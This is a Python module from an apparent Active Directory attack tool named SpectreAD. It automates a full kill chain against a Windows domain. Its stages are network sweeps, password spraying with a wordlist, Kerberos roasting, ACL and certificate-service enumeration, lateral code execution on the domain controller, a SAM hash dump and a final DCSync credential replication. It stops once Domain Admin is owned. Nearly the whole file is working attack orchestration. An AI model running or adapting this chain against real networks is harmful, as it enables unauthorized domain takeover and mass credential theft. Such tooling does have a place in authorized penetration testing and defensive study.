"""
SpectreAD :: core/auto.py
Unattended kill chain with stop conditions and a full attack log.

Author : Inayat Hussain
"""

from __future__ import annotations

import time

from core import ui
from core.creds import Cred, resolve
from core.store import open_store

DA = ("DOMAIN ADMINS", "ENTERPRISE ADMINS")


class Chain:
    def __init__(self, args):
        self.args = args
        self.stop_reason = ""

    def _da_owned(self, store) -> bool:
        owned = {o.upper() for o in store.owned()}
        return any(d in owned for d in DA)

    def run(self) -> None:
        with open_store(self.args.store) as store:
            stages = [
                ("sweep", self.sweep),
                ("dns", self.dns),
                ("policy", self.policy),
                ("smb-audit", self.smb_audit),
                ("spray", self.spray),
                ("roast", self.roast),
                ("acl", self.acl),
                ("delegation", self.delegation),
                ("adcs", self.adcs),
                ("paths", self.paths),
                ("lateral", self.lateral),
                ("dcsync", self.dcsync),
            ]
            for i, (name, fn) in enumerate(stages, 1):
                if self.stop_reason:
                    ui.warn(f"chain stopped: {self.stop_reason}")
                    break
                ui.stage(i, len(stages), name)
                try:
                    fn(store)
                except SystemExit:
                    ui.warn(f"stage {name} aborted")
                except Exception as exc:
                    ui.fail(f"stage {name}: {exc}")
                    store.log("auto", name, result=f"error: {exc}")
                if self._da_owned(store):
                    self.stop_reason = "Domain Admin owned"
            store.log("auto", "finish", result=self.stop_reason or "complete")

    # -- stages -----------------------------------------------------------
    def sweep(self, store):
        from core.hosts import expand, sweep
        targets = expand([self.args.target] if self.args.target else [])
        if self.args.targets:
            with open(self.args.targets) as fh:
                targets += expand([l.strip() for l in fh if l.strip()])
        for r in sweep(targets, self.args.threads, 2.0):
            store.add_host(r["ip"], r["hostname"], r["ports"], dc=r["dc"])

    def dns(self, store):
        from core.dns import enum
        for h in store.dcs():
            enum(h["ip"], self.args.domain, store)

    def policy(self, store):
        from core.ldap import open_conn, policy
        cred = resolve(self.args, store)
        conn, root = open_conn(self.args.domain, self.args.dc_ip, cred)
        policy(conn, root, self.args.domain, store)
        conn.unbind()

    def smb_audit(self, store):
        from core.smb import audit
        cred = resolve(self.args, store, required=False)
        for h in store.hosts():
            audit(h["ip"], cred, store, self.args.timeout)

    def spray(self, store):
        from core import spray as sp
        if store.policy(self.args.domain) is None:
            ui.warn("no policy — skipping spray")
            return
        self.args.passes = 3
        self.args.users = None
        self.args.passwords = self.args.wordlist
        self.args.delay = 0.5
        self.args.jitter = 0.5
        self.args.dry_run = False
        sp.run(self.args)
        for row in store.creds(valid_only=True):
            store.add_owned(row["username"], "spray")

    def roast(self, store):
        from core import roast
        valid = store.creds(valid_only=True)
        if valid:
            self.args.username = valid[0]["username"]
            self.args.password = valid[0]["secret"]
            self.args.hashes = None
        roast.asrep(self.args)
        roast.kerb(self.args)

    def acl(self, store):
        from core.acl import enumerate_aces
        enumerate_aces(self.args)

    def delegation(self, store):
        from core.delegation import report
        report(self.args)

    def adcs(self, store):
        from core.adcs import enumerate_esc
        enumerate_esc(self.args)

    def paths(self, store):
        from core.graph import paths
        paths(self.args)

    def lateral(self, store):
        from core.dump import sam
        from core.lateral import exec_order, run as lat_run
        from core.transport import check_cred

        best = None
        for row in store.creds(valid_only=True):
            c = Cred(row["domain"], row["username"], row["secret"], row["kind"])
            if check_cred(self.args.dc_ip, c):
                best = c
                break
        if best is None:
            ui.warn("no working credential for lateral")
            return

        self.args.target = self.args.dc_ip
        self.args.username = best.username
        self.args.password = best.secret if best.kind == "password" else None
        self.args.hashes = best.secret if best.kind == "hash" else None
        for module in exec_order():
            try:
                lat_run(module, self.args)
                break
            except Exception:
                continue
        try:
            sam(self.args)
        except Exception as exc:
            ui.warn(f"sam dump failed: {exc}")

    def dcsync(self, store):
        from core.dcsync import run as dc

        valid = store.creds(valid_only=True)
        if not valid:
            ui.warn("no credential for replication")
            return

        self.args.username = valid[0]["username"]
        self.args.password = valid[0]["secret"] if valid[0]["kind"] == "password" else None
        self.args.hashes = valid[0]["secret"] if valid[0]["kind"] == "hash" else None
        self.args.target = self.args.dc_ip
        self.args.target_user = None
        self.args.just_ntlm = False
        dc(self.args)


def run(args) -> None:
    ui.warn("FULL AUTO — sprays, roasts, executes, replicates")
    ui.card("chain plan", [
        ("domain", args.domain),
        ("dc", args.dc_ip),
        ("wordlist", args.wordlist),
        ("store", args.store),
        ("final stage", "dcsync"),
    ])
    if not args.yes:
        input("  enter to start, ctrl-c to abort ")
    started = time.time()
    Chain(args).run()
    ui.ok(f"finished in {int(time.time() - started)}s")
